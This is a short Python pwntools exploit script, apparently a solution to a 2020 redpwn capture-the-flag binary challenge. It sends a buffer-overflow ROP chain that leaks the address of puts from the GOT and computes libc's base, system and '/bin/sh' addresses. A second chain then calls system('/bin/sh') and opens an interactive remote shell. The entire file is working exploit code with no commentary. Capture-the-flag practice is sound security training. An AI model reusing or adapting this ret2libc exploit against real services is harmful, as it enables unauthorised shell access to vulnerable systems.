#!/usr/bin/env python2

from pwn import *

host = "2020.redpwnc.tf"
port = 31350

bin_sh_offset = 0x1b3e9a
puts_offset =  0x0809c0
system_offset = 0x04f440
puts_got = p64(0x601018)
puts_plt = p64(0x400520)
_start = p64(0x400550)
pop_rdi = p64(0x0000000000400733)
ret_gadget = p64(0x0000000000400506)

r = remote(host,port)

payload = ""
padding = "A"*24
payload += padding
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += _start

r.recvuntil("Welcome to the library... What's your name?")
r.sendline(payload)

a = r.recvline()
a = r.recvline()
a = r.recvline()
a = r.recvline()

libc_puts = u64(a[:8].strip().ljust(8,'\x00'))
libc_base = libc_puts - puts_offset
libc_system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

print("[*] Found libc puts %s"%(hex(libc_puts)))
print("[*] Found libc base %s"%(hex(libc_base)))
print("[*] Found libc system %s"%(hex(libc_system)))
print("[*] Found /bin/sh string %s"%(hex(bin_sh)))


# second stage

print(r.recvline())

payload = ""
payload += padding
payload += ret_gadget
payload += pop_rdi
payload += p64(bin_sh)
payload += p64(libc_system)

r.sendline(payload)
r.interactive()

